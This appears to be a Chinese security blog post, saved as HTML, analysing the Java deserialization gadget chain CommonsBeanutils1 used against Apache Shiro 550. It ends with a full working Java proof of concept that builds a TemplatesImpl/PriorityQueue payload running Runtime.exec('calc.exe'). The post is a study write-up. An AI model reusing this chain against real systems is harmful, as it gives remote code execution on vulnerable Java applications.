@@ -1,0 +1,353 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>【Java反序列化】CommonBeanutils1利用链 | Limpid</title>
+<link rel="shortcut icon" href="https://limpid94.github.io/favicon.ico?v=1663148874314">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://limpid94.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="【Java反序列化】CommonBeanutils1利用链 | Limpid - Atom Feed" href="https://limpid94.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="前言
+在尝试复现Shiro 550反序列化漏洞的时候发现用cc链不能正常攻击，而网上的一些文章却能正常用CC链进行复现。经过对比发现原始的Shiro环境下没有Common-Collections包，而网上能成功复现的博主大部分都是自己添加了..." />
+    <meta name="keywords" content="" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://limpid94.github.io">
+  <img class="avatar" src="https://limpid94.github.io/images/avatar.png?v=1663148874314" alt="">
+  </a>
+  <h1 class="site-title">
+    Limpid
+  </h1>
+  <p class="site-description">
+    Keep thinking , keeping learning
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              【Java反序列化】CommonBeanutils1利用链
+            </h2>
+            <div class="post-info">
+              <span>
+                2022-04-29
+              </span>
+              <span>
+                6 min read
+              </span>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content">
+                <h2 id="前言">前言</h2>
+<p>在尝试复现Shiro 550反序列化漏洞的时候发现用cc链不能正常攻击，而网上的一些文章却能正常用CC链进行复现。经过对比发现原始的Shiro环境下没有Common-Collections包，而网上能成功复现的博主大部分都是自己添加了CC包。于是思考在无CC包的情况下如何进行利用。当然已经有大牛给出了答案，使用CommonBeanutils包来构造反序列化链接。</p>
+<h2 id="调用链">调用链</h2>
+<pre><code class="language-text">PriorityQueue.readObject()
+	PriorityQueue.heapify()
+		PriorityQueue.siftDown()
+			siftDownUsingComparator()
+				BeanComparator.compare()
+					TemplatesImpl.getOutputProperties()
+						TemplatesImpl.newTransformer()
+							TemplatesImpl.getTransletInstance()
+								TemplatesImpl.defineTransletClasses()
+									TemplatesImpl.TransletClassLoader.defineClass()
+										Pwner*(Javassist-generated).&lt;static init&gt;
+											Runtime.exec()
+</code></pre>
+<h2 id="相关知识点">相关知识点</h2>
+<h3 id="commonbeanutils">CommonBeanutils</h3>
+<p>CommonBeanutils提供了一组便捷的动态操作JavaBean的API，代替复杂的反射模式。<br>
+其中值得关注的有<code>org.apache.commons.beanutils.BeanComparator</code> ，其实现了<code>Comparator</code>接口可以用来比较两个Bean属性的内容。<br>
+<img src="https://limpid94.github.io/post-images/1651219689079.png" alt="" loading="lazy"><br>
+查看其构造函数，一共有三个：</p>
+<pre><code class="language-java">    public BeanComparator() {
+        this( null );
+    }
+
+    public BeanComparator( String property ) {
+        this( property, ComparableComparator.getInstance() );
+    }
+
+    public BeanComparator( String property, Comparator comparator ) {
+        setProperty( property );
+        if (comparator != null) {
+            this.comparator = comparator;
+        } else {
+            this.comparator = ComparableComparator.getInstance();
+        }
+    }
+</code></pre>
+<p>构造函数需要传入两个函数第二个函数若不传则默认调用<code>ComparableComparator</code>，其源于CommonsCollections。但如果传入了一个原生的<code>Comparator</code>则可以摆脱对CC包的依赖。<br>
+再看它的compare方法</p>
+<pre><code class="language-java">    public int compare( Object o1, Object o2 ) {
+        
+        if ( property == null ) {
+            // compare the actual objects
+            return comparator.compare( o1, o2 );
+        }
+        
+        try {
+            Object value1 = PropertyUtils.getProperty( o1, property );
+            Object value2 = PropertyUtils.getProperty( o2, property );
+            return comparator.compare( value1, value2 );
+        }
+        catch ( IllegalAccessException iae ) {
+            throw new RuntimeException( &quot;IllegalAccessException: &quot; + iae.toString() );
+        } 
+        catch ( InvocationTargetException ite ) {
+            throw new RuntimeException( &quot;InvocationTargetException: &quot; + ite.toString() );
+        }
+        catch ( NoSuchMethodException nsme ) {
+            throw new RuntimeException( &quot;NoSuchMethodException: &quot; + nsme.toString() );
+        } 
+    }
+</code></pre>
+<p>该方法会调用<code>PropertyUtils.getProperty()</code>来获取两个对象的<code>property</code>属性的值，然后调用<code>internalCompare()</code>方法调用实例化的<code>comparator</code> 的<code>compare</code> 方法进行比较。而<code>getProperty()</code>相当于获取传入的对象的指定属性的<code>getter/setter</code>方法。例如传入<code>User</code>和<code>name</code>，相当于调用 <code>User.getName()</code>。</p>
+<h2 id="反序列化利用链构造">反序列化利用链构造</h2>
+<p>这里用来触发恶意代码的TemplatesImpl的<code>newTransformer()</code>是被自身类中的<code>getOutputProperties()</code>所调用。<br>
+<img src="https://limpid94.github.io/post-images/1651404435994.png" alt="" loading="lazy"><br>
+之所以<code>getOutputProperties</code>方法是因为可以搭配<code>BeanComparator#compare()</code>，利用其中调用类的getter/setter方法的手段来调用<code>getOutputProperties</code>属性的值。<br>
+为了进一步触发<code>BeanComparator</code>类的<code>compare</code>方法，可考虑CC链中的<code>PriorityQueue</code>类。<br>
+<code>PriorityQueue</code>的调用过程在CC2反序列化的文章内有分析过，简单说就是<code>PriorityQueue#readObject()</code> 调用了<code>heapify()</code>，而在<code>heapify()</code>中为了遍历和排序元素，将其传入<code>siftDown()</code>中。如果<code>comparator</code>不为空的话会进入<code>siftDownUsingComparator()</code>中，</p>
+<pre><code class="language-java">    private void siftDown(int k, E x) {
+        if (comparator != null)
+            siftDownUsingComparator(k, x);
+        else
+            siftDownComparable(k, x);
+    }
+</code></pre>
+<p>而在<code>siftDownUsingComparator()</code>中调用了<code>compare</code>方法，也就跟<code>BeanComparator</code>中的<code>compare</code>方法链接起来</p>
+<h2 id="poc">POC</h2>
+<pre><code class="language-java">package cc.commonbeanutils;
+
+import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+import javassist.ClassClassPath;
+import javassist.ClassPool;
+import javassist.CtClass;
+import javassist.CtConstructor;
+import org.apache.commons.beanutils.BeanComparator;
+
+import java.io.*;
+import java.lang.reflect.Field;
+import java.util.PriorityQueue;
+
+public class CommonBeanutils1 {
+    public static void main(String[] args) throws Exception {
+        //获取默认类池
+        ClassPool pool = ClassPool.getDefault();
+        //添加路径
+        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
+        //创建新类
+        CtClass evil = pool.makeClass(&quot;Evil&quot;);
+        //设置类名
+        evil.setName(&quot;MyEvil&quot;);
+        //设置要继承的类
+        evil.setSuperclass(pool.get(AbstractTranslet.class.getName()));
+        //创建空的构造函数
+        CtConstructor newconstructor = evil.makeClassInitializer();
+        //将字节码插入开头
+        newconstructor.insertBefore(&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc.exe\&quot;);&quot;);
+        evil.writeFile();
+
+        byte[] bytecode = evil.toBytecode();
+        byte[][] bytecodes = {bytecode};
+
+        TemplatesImpl templates = new TemplatesImpl();
+        Class templatesClass = templates.getClass();
+        Field nameField = templatesClass.getDeclaredField(&quot;_name&quot;);
+        nameField.setAccessible(true);
+        nameField.set(templates,&quot;aaa&quot;);
+
+        Field bytecodesField = templatesClass.getDeclaredField(&quot;_bytecodes&quot;);
+        bytecodesField.setAccessible(true);
+        bytecodesField.set(templates,bytecodes);
+
+        Field tfactoryField = templatesClass.getDeclaredField(&quot;_tfactory&quot;);
+        tfactoryField.setAccessible(true);
+        tfactoryField.set(templates,new TransformerFactoryImpl());
+        //++++++++++++++++++++++++++++++++代码执行部分结束+++++++++++++++++++++++++++++++++++++
+
+        BeanComparator beanComparator = new BeanComparator();
+        PriorityQueue&lt;Object&gt; queue = new PriorityQueue&lt;Object&gt;(2, beanComparator);
+        queue.add(&quot;1&quot;);
+        queue.add(&quot;2&quot;);
+
+        Field propertyField = beanComparator.getClass().getDeclaredField(&quot;property&quot;);
+        propertyField.setAccessible(true);
+        propertyField.set(beanComparator,&quot;outputProperties&quot;);
+
+        Field queueField = queue.getClass().getDeclaredField(&quot;queue&quot;);
+        queueField.setAccessible(true);
+        queueField.set(queue, new Object[]{templates,templates});
+
+        Field comparatorField = beanComparator.getClass().getDeclaredField(&quot;comparator&quot;);
+        comparatorField.setAccessible(true);
+        comparatorField.set(beanComparator,String.CASE_INSENSITIVE_ORDER);
+
+
+//        mySeriable(queue);
+        myDeseriable(&quot;seccb1.bin&quot;);
+
+    }
+    public static void mySeriable(Object obj) throws IOException {
+        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;seccb1.bin&quot;));
+        oos.writeObject(obj);
+        oos.close();
+    }
+
+    public static Object myDeseriable(String s) throws IOException, ClassNotFoundException {
+        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(s));
+        return ois.readObject();
+    }
+}
+
+</code></pre>
+<h2 id="参考材料">参考材料</h2>
+<p>https://www.cnblogs.com/9eek/p/15123125.html<br>
+https://www.leavesongs.com/PENETRATION/commons-beanutils-without-commons-collections.html<br>
+https://blog.weik1.top/2021/01/18/CommonsBeanutils%E9%93%BE%E5%88%86%E6%9E%90/<br>
+https://www.cnblogs.com/zpchcbd/p/14957034.html<br>
+https://su18.org/post/ysoserial-su18-3/#beancomparator</p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li>
+<ul>
+<li><a href="#%E5%89%8D%E8%A8%80">前言</a></li>
+<li><a href="#%E8%B0%83%E7%94%A8%E9%93%BE">调用链</a></li>
+<li><a href="#%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E7%82%B9">相关知识点</a>
+<ul>
+<li><a href="#commonbeanutils">CommonBeanutils</a></li>
+</ul>
+</li>
+<li><a href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0">反序列化利用链构造</a></li>
+<li><a href="#poc">POC</a></li>
+<li><a href="#%E5%8F%82%E8%80%83%E6%9D%90%E6%96%99">参考材料</a></li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://limpid94.github.io/post/java-fan-xu-lie-hua-commoncollections7-li-yong-lian/">
+              <h3 class="post-title">
+                【Java反序列化】CommonCollections7利用链
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by Limpid .
+  <a class="rss" href="https://limpid94.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
